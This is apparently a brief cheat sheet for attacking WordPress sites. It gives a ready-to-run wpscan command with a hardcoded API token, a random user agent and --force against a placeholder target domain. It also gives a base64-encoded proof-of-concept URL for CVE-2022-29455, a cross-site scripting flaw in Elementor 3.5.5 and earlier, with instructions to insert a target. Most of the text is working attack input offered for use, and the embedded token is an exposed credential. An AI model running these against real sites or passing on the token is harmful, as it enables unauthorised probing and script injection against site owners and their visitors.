Scan WORDPRESS BUGS
Wordpress Websites

WPSCAN full command:- 

sudo wpscan --url https://yourtargetdomain.com/ -e at,ap,cb,dbe --api-token rzp6gVsU35jbCTQM6xdJ5204r7Vs5iaYbKHXRCmyDf4 --rua --force


# CVE-2022-29455

Wordpress Vulnerability - XSS ( Cross-Site Scripting )

## **Vulnerability Location**
```https://add your target here/wp-content/plugins/elementor/assets/js/frontend.min.js```

## Vulnerable Version <= 3.5.5 versions

## **Proof of Concept (PoC)**
```https://add your target here/#elementor-action:action=lightbox&settings=eyJ0eXBlIjoibnVsbCIsImh0bWwiOiI8c2NyaXB0PmFsZXJ0KCd4c3MnKTwvc2NyaXB0PiJ9Cg==```

> Example - https://www.youtube.com/watch?v=4qvO_kSbhcE
